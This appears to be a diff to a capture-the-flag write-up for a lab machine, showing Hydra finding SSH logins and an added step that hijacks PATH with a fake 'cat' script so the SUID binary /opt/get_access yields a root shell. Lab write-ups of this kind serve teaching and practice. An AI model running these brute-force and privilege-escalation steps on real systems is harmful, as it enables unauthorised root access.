@@ -313,6 +313,7 @@ Successfully installed mysql-connector-python-8.0.30 protobuf-3.20.1
 ```
 
 Run python script and find 2 ssh valid logins:
+
 ```shel
 └─$ python extract_ica1_os_pass.py 
 MySQL connection is closed
@@ -328,7 +329,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-05 19:39:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-05 19:39:43
                                                                                                             
 └─$ 
-
 ```
 
 Login with dexter user:
@@ -404,3 +404,20 @@ cat /root/system.info
 dexter@debian:~$ 
 ```
 
+It seems that the cat command is executed in this file with suid root, so we are going to perform a privilege escalation by modifying the PATH variable
+
+```shell
+dexter@debian:~$ pwd
+/home/dexter/
+dexter@debian:~$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+dexter@debian:~$ export PATH=/home/dexter/:$PATH
+dexter@debian:~$ echo $PATH
+/home/dexter/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+dexter@debian:~$ echo "/bin/bash" > cat
+dexter@debian:~$ chmod 755 ./cat
+dexter@debian:~$ /opt/get_access
+root@debian:~# whoami
+root
+root@debian:~# 
+```
